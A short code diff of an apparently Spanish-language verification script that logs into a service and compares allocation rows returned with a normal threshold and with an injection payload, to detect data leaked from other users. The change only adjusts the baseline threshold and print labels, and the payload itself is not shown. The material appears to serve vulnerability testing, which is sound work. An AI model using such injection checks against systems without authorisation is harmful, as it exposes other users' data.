@@ -74,13 +74,13 @@ def main():
         print(f"[V2] ERROR de login contra {BASE}: {e}")
         return 2
 
-    base_rows = rows(allocations(opener, "-1"))      # solo propias
+    base_rows = rows(allocations(opener, "0"))       # threshold valido: solo propias
     inj_rows = rows(allocations(opener, INJECTION))  # intento de inyeccion
 
     print(f"[V2] Destino: {BASE}  userId={USER_ID}")
     print(f"[V2] Payload threshold: {INJECTION!r}")
-    print(f"[V2] Linea base (threshold=-1): {len(base_rows)} fila(s) -> {sorted(set(base_rows))}")
-    print(f"[V2] Con inyeccion:             {len(inj_rows)} fila(s) -> {sorted(set(inj_rows))}")
+    print(f"[V2] Linea base (threshold=0): {len(base_rows)} fila(s) -> {sorted(set(base_rows))}")
+    print(f"[V2] Con inyeccion:            {len(inj_rows)} fila(s) -> {sorted(set(inj_rows))}")
 
     leaked = sorted(set(inj_rows) - set(base_rows))
     if len(inj_rows) > len(base_rows) and leaked:
